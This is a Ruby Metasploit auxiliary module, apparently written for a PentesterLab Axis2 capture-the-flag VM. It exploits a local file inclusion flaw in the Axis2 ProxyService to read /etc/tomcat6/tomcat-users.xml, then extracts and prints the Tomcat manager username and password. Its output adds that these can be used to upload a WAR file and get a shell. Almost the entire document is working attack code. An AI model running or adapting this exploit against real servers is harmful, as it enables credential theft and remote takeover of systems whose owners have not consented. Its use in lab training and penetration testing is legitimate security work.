##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'LFI in Axis2 CTF',
      'Description'    => %q{
          This module exploits an Axis2 CTF Local File Include bug. After reading the file
          we will get credentials to next stage on VM...
      },
      'Author'         =>
        [
          'Cody Sixteen <610code gmail com>',
          # Thanks to pentesterlab.com for preparing VM
          # More: http://code610.blogspot.com/2016/05/pentester-lab-ctf-axis2-and-tomcat.html
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/ProxyService']),
    ], self.class)
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    print_status("Checking : " + uri.to_s)

    lfi_payload = "/get?uri=file:///etc/tomcat6/tomcat-users.xml"

    res = send_request_raw({
        'method'        => 'GET',
        'uri'           => normalize_uri(target_uri.path, lfi_payload)
    })

    res.body.each_line do |line|
      if line.match("manager") and line.match("password")
        print_good("Found password for manager :)")
        spass = line.match('password="(.*?)"')[1]
        slogin = line.match('username="(.*?)"')[1]
        print_good("Login   : " + slogin.to_s)
        print_good("Password: " + spass.to_s)


        print_good("You will use it to upload WAR file and get a shell on Axis2 CTF")
      end
    end
    print_status("Cheers!")
  end
end

